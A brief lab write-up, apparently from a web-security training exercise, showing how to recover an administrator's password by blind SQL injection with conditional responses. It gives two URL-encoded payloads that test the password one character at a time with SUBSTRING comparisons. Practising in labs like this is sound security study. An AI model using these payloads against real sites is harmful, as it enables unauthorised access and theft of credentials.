---
title: Lab 1 - blind SQL injection with conditional respo...
updated: 2023-06-21T15:21:26.0000000+01:00
created: 2023-06-12T09:36:15.0000000+01:00
---

![image1](../../../../_resources/image1-17.png)

We use blind SQL queries to figure out the password of the admin user character by character, for example:
![image2](../../../../_resources/image2-16.png)

***xyz'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)\>'m***

The page displays "welcome back" if the query returns any rows:
![image3](../../../../_resources/image3-12.png)

We can check using greater than and lower than symbols, finally, we can check a character by using the equals:

***xyz'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='s***
![image4](../../../../_resources/image4-8.png)
